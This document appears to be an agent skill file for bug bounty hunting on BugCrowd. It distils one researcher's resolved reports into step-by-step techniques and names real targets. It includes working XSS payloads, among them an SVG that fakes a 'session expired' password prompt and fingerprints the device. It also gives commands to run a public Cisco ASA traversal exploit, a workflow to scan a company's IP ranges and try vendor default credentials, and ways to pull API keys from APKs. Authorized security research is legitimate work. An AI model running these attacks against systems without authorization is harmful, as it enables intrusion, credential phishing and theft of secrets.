---
name: bugcrowd-bugbounty
description: BugCrowd techniques from real resolved reports (Atlassian $300, Centrify $100, Skyscanner P2, Netflix P3, Segment P3, Trello P3, Tesla P5). Use when hunting on BugCrowd programs. Confirmed skills — stored XSS via Word .doc javascript: URI in iOS browsers (Atlassian Confluence; .docx does NOT reproduce); CVE-2018-0296 Cisco ASA path traversal unauth (sessions + dir index, Centrify/Criteo); Firebase exposure via APK + apktool + /.json check (Skyscanner); default creds on network gear in target ASN (Huawei S7706 admin/admin@huawei.com, Netflix); missing email domain verification for privilege escalation on B2B SaaS (Segment — register anything@target-domain.com); stored XSS via SVG in iOS with navigator fingerprinting (Trello iOS); SVG XSS via xlink:href + data URI base64 evading event-handler filters; API keys in APK assets/ via plain unzip (Tesla — env.json, google-services.json). Spanish triggers — "bugcrowd", "bug bounty en bugcrowd", "xss en doc", "firebase apk", "cisco asa cve", "credenciales por defecto en red".
---

## Findings profile (BugCrowd)

- **Programs:** Atlassian, and others (in progress)

- **Confirmed resolved so far:** Atlassian ($300), Centrify ($100), Skyscanner (duplicate, P2), Netflix (informational, P3), Segment (duplicate, P3), Trello (resolved duplicate, P3), Tesla (informational, P5)

---

## Confirmed skills (resolved reports)

### 1. Stored XSS via Word 97-2003 (.doc) — javascript: URI in hyperlinks — iOS browsers
**Reward:** $300 | **Target:** Atlassian Confluence (api.media.atlassian.com) | **Date:** Feb 2018

- Create a Word document with a hyperlink pointing to `javascript:alert(1)//%22onclick=alert(2)//`
- **Critical:** must be saved as "Word 97-2003 Document" (.doc) — the .docx format does NOT reproduce the bug
- Upload the .doc as a comment on a public Confluence page with anonymous user permissions
- Copy the document URL and open it in any iOS browser (Safari, Firefox, Chrome, Opera)
- The XSS executes when clicking the hyperlink — no login required if the page is public
- **Ideal targets:** Platforms with Office document viewers on iOS, pages with anonymous comments, corporate wikis (Confluence, SharePoint)
- **Known variant:** payload with double bypass `javascript:alert(1)//%22onclick=alert(2)//` evades basic javascript: URI filters

### 2. CVE-2018-0296 — Cisco ASA Path Traversal without authentication
**Reward:** $100 | **Target:** Centrify (remote.centrify.com) | **Date:** Jun 2018

- Cisco ASA vulnerable to directory traversal that exposes sensitive system information without authentication
- Information exposed: active sessions, active users, directory index
- Identify the target: look for `/+CSCOE+/logon.html` in the URL — indicates Cisco ASA
- **Exploit:**
  ```bash
  git clone https://github.com/yassineaboukir/CVE-2018-0296
  cd CVE-2018-0296 && python cisco_asa.py https://target.com/
  ```
- **Confirmed in two different programs:** Criteo (HackerOne) and Centrify (BugCrowd) — high-yield technique on companies with legacy VPN/ASA infrastructure
- **Quick tool:** `nuclei -t cves/2018/CVE-2018-0296.yaml -u https://target.com`
- **Ideal targets:** Companies with corporate Cisco ASA VPN, remote access portals (`remote.*`, `vpn.*`, `access.*`)

### 3. Firebase database exposed via APK reverse engineering
**Reward:** 5pts (duplicate) | **Target:** Skyscanner Android | **Date:** Nov 2018 | **Priority:** P2

- Extract APK from device and decompile it to find hardcoded Firebase URLs
- **Full workflow:**
  ```bash
  # 1. Extract APK
  adb pull data/app/<package.name>/base.apk

  # 2. Decompile
  apktool d base.apk

  # 3. Search Firebase URL
  grep -ir firebase base/ | grep http

  # 4. Verify misconfiguration (public database)
  curl -X GET https://<project>.firebaseio.com/.json
  ```
- If it responds with JSON data → fully exposed database without authentication
- The Firebase URL is usually in `AndroidManifest.xml` or in configuration files within the APK
- **Ideal targets:** Android mobile apps from large companies, especially if they use Firebase as backend
- **Variant:** also look for `google-services.json` inside the decompiled APK — contains project ID and API keys
- **Note:** P2 confirmed valid even though it was a duplicate — indicates it is a high-impact finding actively sought

### 4. Default credentials in network equipment — Exposed Huawei switch
**Reward:** 10pts (informational) | **Target:** Netflix CIDR (45.57.51.45) | **Date:** Aug 2019 | **Priority:** P3

- Identify management interfaces of switches/routers exposed in target's CIDR ranges
- **Workflow:**
  ```bash
  # 1. Confirm IP/range owner
  whois <IP> | grep -i "CIDR\|organization"

  # 2. Scan management ports in the range
  nmap -p 80,443,8080,8443,23,22 <CIDR> --open

  # 3. Identify equipment model from login page

  # 4. Try default credentials per vendor
  ```
- **Default Huawei S7706 credentials:** `admin` / `admin@huawei.com`
- Other common network defaults: Cisco (`cisco/cisco`, `admin/admin`), Juniper (`root/` no password), Netgear (`admin/password`)
- **Ideal targets:** Large corporate CIDRs, target ASN IPs (obtain with `whois` or `bgp.he.net`)
- **Tools:** `shodan.io` (filter by `org:"Netflix"` + `port:443` + `product:"Huawei"`), `masscan`, `nmap`
- **Note:** Although informational at Netflix, full administrative access to a network switch is a critical finding in other programs

### 5. Privilege escalation via missing email domain verification
**Reward:** 2pts (duplicate) | **Target:** Segment (app.segment.com) | **Date:** Dec 2018 | **Priority:** P3

- B2B SaaS platforms that associate workspaces/organizations to the email domain without verifying real ownership
- **Technique:** register with `anything@target-domain.com` (e.g., `omespino@segment.com`) without confirming ownership of the domain
- **Impact:** access to or connection with the victim organization's resources (websites, dashboards, billing) using a fake email from their domain
- **Variants to try:**
  - `admin@target.com`, `webmaster@target.com`, `help@target.com`, `security@target.com`
  - Register with email from the bug bounty program's own domain
- **Ideal targets:** SaaS platforms with email-domain-based onboarding (analytics, marketing, CRM, CDPs such as Segment, Mixpanel, HubSpot)
- **Indicator:** during signup, if the platform automatically associates the workspace to the email domain without sending verification → vulnerable

### 6. Stored XSS via SVG in iOS apps — with fingerprinting and phishing payload
**Reward:** 2pts (resolved duplicate) | **Target:** Trello iOS app v4.7.0 | **Date:** Dec 2018 | **Priority:** P3

- Same SVG/XML technique as Slack and Yahoo Mail (HackerOne) — confirms the vector was widespread in iOS apps of the era
- **Advanced payload** that goes beyond `alert()` — includes device fingerprinting and password phishing:
  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <svg onload="alert(navigator.appVersion);
    var p=prompt('Session expired, insert your password');
    alert('password sent: '+p);
    var n={};for(var p in navigator){n[p]=navigator[p]};
    alert('fingerprint: '+JSON.stringify(n,null,2))"
    xmlns="http://www.w3.org/2000/svg">
  </svg>
  ```
- **Impact demonstrated in the report:**
  - Fingerprinting: iOS version, device model, language via `navigator` object
  - Credential phishing: "session expired" popup to capture password
  - Approximate user geolocation via IP
  - Detection of user activity (when they open the file)
- **Entry vector:** attachment on a Trello card → opened from iOS app
- **Ideal targets:** Any collaboration/productivity platform with file viewer on iOS (Trello, Jira, Notion, Asana, Monday)
- **Methodology note:** using payloads with demonstrable impact (fingerprinting, phishing) instead of just `alert(1)` raises the perceived severity of the report

### 7. Stored XSS via SVG — xlink:href + data URI base64 variant (clickable)
**Reward:** none (not-applicable) | **Target:** Atlassian Confluence iOS | **Date:** Nov 2018 | **Priority:** P2 suggested

- SVG XSS variant that does not require `onload` — uses a clickable element with `xlink:href` pointing to `data:text/html;base64,<payload>`
- Useful when filters block event attributes (`onload`, `onerror`) but not `xlink:href`
- **Base payload:**
  ```xml
  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <a xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
      <circle cx="225" cy="125" r="100" fill="brown"/>
      <text x="0" y="20" font-size="30">Click me</text>
    </a>
  </svg>
  ```
  *(the base64 decodes to `<script>alert('xss')</script>`)*
- **Key difference vs `onload`:** requires user click but evades event handler filters
- **Ideal targets:** Platforms that render SVG with `xlink` support but filter event attributes (Confluence, Jira, corporate wikis)
- **Note:** was not-applicable at Atlassian probably because they had already received the .doc report — the technique is valid

### 8. API keys exposed in APK assets/ — no decompilation needed
**Reward:** none (informational) | **Target:** Tesla Android v3.3.1 | **Date:** Feb 2018 | **Priority:** P5

- APKs are standard ZIP files — many apps store sensitive configs in `assets/` unencrypted, accessible with a simple `unzip`
- **Quick workflow (without apktool):**
  ```bash
  unzip -d app-source com.target.app.apk
  # Search config files in assets
  find app-source/assets/ -name "*.json" -o -name "*.env" -o -name "*.xml" | xargs grep -l "key\|secret\|token\|password\|api"
  ```
- **High-value files to look for:** `env.json`, `config.json`, `google-services.json`, `secrets.xml`, `BuildConfig`
- At Tesla: `assets/shared/env.json` contained OAuth2 private keys (Doorkeeper)
- **Key difference vs apktool:** `unzip` is enough to read assets without compiling — faster for initial recon
- **Ideal targets:** Android apps from companies that use JS frameworks (React Native, Ionic, Cordova) — they tend to have configs in `assets/`
- **Note:** P5 at Tesla probably because the keys had additional mitigations — in other programs this kind of exposure can be P1/P2
